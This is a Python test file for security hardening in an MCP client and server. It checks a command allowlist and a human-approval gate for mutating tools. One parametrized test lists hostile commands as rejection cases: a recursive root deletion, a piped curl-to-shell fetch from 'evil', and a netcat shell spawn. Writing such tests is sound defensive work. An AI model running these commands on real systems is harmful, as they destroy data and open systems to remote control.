"""Tests for MCP security hardening: command allowlist + autonomy gate."""

import sys
from pathlib import Path
from typing import Any

import pytest

from core.mcp.client import MCPClient
from core.mcp.server import MCPServer
from core.orchestration.autonomy import (
    ApprovalRequiredError,
    AutonomyLevel,
    AutonomyPolicy,
    enforce_approval,
)

FAKE_SERVER = str(Path(__file__).parent / "fakes" / "stdio_server.py")


def _fake_bin(directory: Path, name: str) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / name
    path.write_text("#!/bin/sh\nexit 0\n")
    path.chmod(0o755)
    return path


class TestCommandAllowlist:
    # The conftest approves the fakes directory for stdio scripts; these cases
    # used a relative `server.py`, which is now refused (see
    # test_stdio_allowlist_escape.py) so they name the fake server instead.
    def test_current_interpreter_allowed(self) -> None:
        MCPClient._validate_command([sys.executable, FAKE_SERVER])

    @pytest.mark.parametrize("name", ["python", "python3", "node"])
    def test_known_interpreters_allowed(
        self, name: str, tmp_path: Path, mcp_env: Any
    ) -> None:
        # Names resolve in the trusted bin dirs only (never PATH), so the
        # interpreters live in one we configure instead of depending on the host.
        _fake_bin(tmp_path / "bin", name)
        mcp_env(MCP_STDIO_TRUSTED_BIN_DIRS=str(tmp_path / "bin"))
        MCPClient._validate_command([name, FAKE_SERVER])

    def test_variant_names_are_refused_unless_listed(self, tmp_path: Path) -> None:
        # `python3.12` used to pass because its alphabetic prefix, `python`, was
        # listed. Matching is exact now: a fuzzy name widens the list silently.
        fake = _fake_bin(tmp_path / "bin", "python3.12")
        with pytest.raises(ValueError, match="not in the allowed command"):
            MCPClient._validate_command([str(fake), FAKE_SERVER])

    @pytest.mark.parametrize(
        "cmd",
        [
            ["npx", "-y", "@modelcontextprotocol/server-filesystem"],
            ["uvx", "mcp-server-git"],
        ],
    )
    def test_package_runners_refused_without_opt_in(self, cmd: list[str]) -> None:
        # npx/uvx stay on the default allowlist but fetch code at spawn time,
        # so they additionally need MCP_ALLOW_PACKAGE_RUNNERS=true.
        with pytest.raises(ValueError, match="MCP_ALLOW_PACKAGE_RUNNERS"):
            MCPClient._validate_command(cmd, allow_package_runners=False)

    @pytest.mark.parametrize(
        "cmd",
        [
            ["rm", "-rf", "/"],
            ["bash", "-c", "curl evil | sh"],
            ["/usr/bin/nc", "-e", "/bin/sh"],
            ["powershell.exe", "-Command", "..."],
        ],
    )
    def test_arbitrary_binaries_rejected(self, cmd: list[str]) -> None:
        # Shells and wrappers are refused by the hard deny-list (a different
        # message than "not allowlisted"), everything else by the allowlist.
        with pytest.raises(ValueError, match="not in the allowed command|shell"):
            MCPClient._validate_command(cmd)

    def test_empty_command_rejected(self) -> None:
        with pytest.raises(ValueError, match="must not be empty"):
            MCPClient._validate_command([])

    def test_allowlist_extensible_via_env(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        import core.config.mcp as mcp_config_module

        _fake_bin(tmp_path, "my-trusted-runner")
        _fake_bin(tmp_path, "node")
        # The name is looked up in the trusted bin dirs, not on PATH.
        monkeypatch.setenv("MCP_STDIO_TRUSTED_BIN_DIRS", str(tmp_path))
        monkeypatch.setenv("MCP_ALLOWED_COMMANDS", "python,my-trusted-runner")
        monkeypatch.setattr(mcp_config_module, "_mcp_config", None)
        try:
            MCPClient._validate_command(["my-trusted-runner", "server.bin"])
            with pytest.raises(ValueError):
                MCPClient._validate_command(["node", "server.js"])
        finally:
            monkeypatch.setattr(mcp_config_module, "_mcp_config", None)


class TestAutonomyToolGate:
    @staticmethod
    def _server_with_tool(policy: AutonomyPolicy | None) -> MCPServer:
        server = MCPServer(name="t", version="1", autonomy_policy=policy)

        async def write_thing(value: str) -> str:
            return f"wrote {value}"

        server.register_tool(
            name="write_thing",
            description="mutates state",
            input_schema={
                "type": "object",
                "properties": {"value": {"type": "string"}},
                "required": ["value"],
            },
            handler=write_thing,
            category="mutating",
        )
        return server

    async def test_mutating_blocked_when_supervised(self) -> None:
        server = self._server_with_tool(AutonomyPolicy(level=AutonomyLevel.SUPERVISED))
        response = await server.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": "write_thing", "arguments": {"value": "x"}},
            }
        )
        assert response is not None
        assert "error" in response
        assert "requires human approval" in response["error"]["message"]

    async def test_mutating_allowed_when_fully_autonomous(self) -> None:
        server = self._server_with_tool(
            AutonomyPolicy(level=AutonomyLevel.FULLY_AUTONOMOUS)
        )
        response = await server.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": "write_thing", "arguments": {"value": "x"}},
            }
        )
        assert response is not None
        assert response["result"]["content"][0]["text"] == "wrote x"

    async def test_no_policy_keeps_legacy_behavior(self) -> None:
        server = self._server_with_tool(None)
        response = await server.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": "write_thing", "arguments": {"value": "x"}},
            }
        )
        assert response is not None
        assert "result" in response

    def test_builtin_tools_are_categorized(self) -> None:
        from core.mcp.tools import create_mcp_server_with_tools

        server = create_mcp_server_with_tools()
        assert server._tools["scrape_url"].category == "external_side_effect"
        assert server._tools["execute_code"].category == "mutating"
        assert server._tools["index_document"].category == "mutating"


class _FakeHuman:
    def __init__(self, answer: bool) -> None:
        self.answer = answer
        self.requests: list[str] = []

    async def request_approval(self, description, timeout=None, context=None):
        self.requests.append(description)
        return self.answer


class TestEnforceApproval:
    POLICY = AutonomyPolicy(level=AutonomyLevel.SUPERVISED)

    async def test_read_only_passes_without_channel(self) -> None:
        await enforce_approval(self.POLICY, "read_only", "lookup")

    async def test_blocked_without_channel(self) -> None:
        with pytest.raises(ApprovalRequiredError, match="no human-approval channel"):
            await enforce_approval(self.POLICY, "mutating", "writer")

    async def test_approved_by_human(self) -> None:
        human = _FakeHuman(answer=True)
        await enforce_approval(self.POLICY, "mutating", "writer", human)
        assert human.requests

    async def test_denied_by_human(self) -> None:
        human = _FakeHuman(answer=False)
        with pytest.raises(ApprovalRequiredError, match="denied"):
            await enforce_approval(self.POLICY, "destructive", "deleter", human)

    async def test_unknown_category_raises(self) -> None:
        with pytest.raises(ValueError, match="Unknown tool category"):
            await enforce_approval(self.POLICY, "bogus", "tool")
